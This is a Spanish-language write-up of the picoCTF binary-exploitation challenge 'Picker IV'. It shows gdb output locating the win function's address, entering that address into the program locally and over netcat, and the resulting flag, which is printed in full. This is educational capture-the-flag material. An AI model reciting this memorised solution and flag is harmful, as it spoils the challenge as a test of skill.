# Picker IV

# Objetivo
Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 65468` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV).

# Pistas
- With Python, there are no binaries. With compiled languages like C, there is source code, and there are binaries. Binaries are created from source code, they are a conversion from the human-readable source code, to the highly efficient machine language, in this case: x86_64.
- How can you find the address that `win` is at?

# Solución
- Descargamos el ejecutable y el codigo fuente
- Inspeccionamos el codigo fuente
- La bandera se imprime en la funcion win
- Ahora ejecutamos el codigo y este nos pide a donde saltar en la pila
- Por lo que ingresamos con gdb
- Y obtenemos la direccion de la función win
```
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/picker]
└─$ gdb picker-IV 
GNU gdb (Debian 13.1-2) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from picker-IV...
(No debugging symbols found in picker-IV)
(gdb) info address win
Symbol "win" is at 0x40129e in a file compiled without debugging.
(gdb) exit
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/picker]
└─$ ./picker-IV  
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
Cannot open file.
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/picker]
└─$ nc saturn.picoctf.net 65468
Enter the address in hex to jump to, excluding '0x': nc saturn.picoctf.net 65468^Z
zsh: suspended  nc saturn.picoctf.net 65468
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/picker]
└─$ nc saturn.picoctf.net 65468
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
                                                                                  
┌──(kali㉿kali)-[~/picoctf/tercer-parcial/binary/picker]
└─$ 

```

# Bandera
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()